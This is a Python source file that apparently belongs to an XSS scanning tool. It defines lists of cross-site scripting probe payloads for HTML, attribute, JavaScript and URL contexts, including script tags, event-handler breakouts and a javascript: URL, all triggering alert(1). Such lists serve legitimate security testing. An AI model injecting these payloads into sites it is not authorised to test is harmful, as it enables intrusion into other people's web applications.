from core.payloads.base import Payload

HTML_PAYLOADS = [
    Payload("<script>alert(1)</script>", "html"),
    Payload("<svg/onload=alert(1)>", "html"),
]

ATTR_PAYLOADS = [
    Payload("\" onmouseover=alert(1) x=\"", "attr"),
    Payload("' autofocus onfocus=alert(1) '", "attr"),
]

JS_PAYLOADS = [
    Payload("';alert(1);//", "js"),
    Payload("alert(1)", "js"),
]

URL_PAYLOADS = [
    Payload("javascript:alert(1)", "url"),
]

ALL_PAYLOADS = (
    HTML_PAYLOADS +
    ATTR_PAYLOADS +
    JS_PAYLOADS +
    URL_PAYLOADS
)
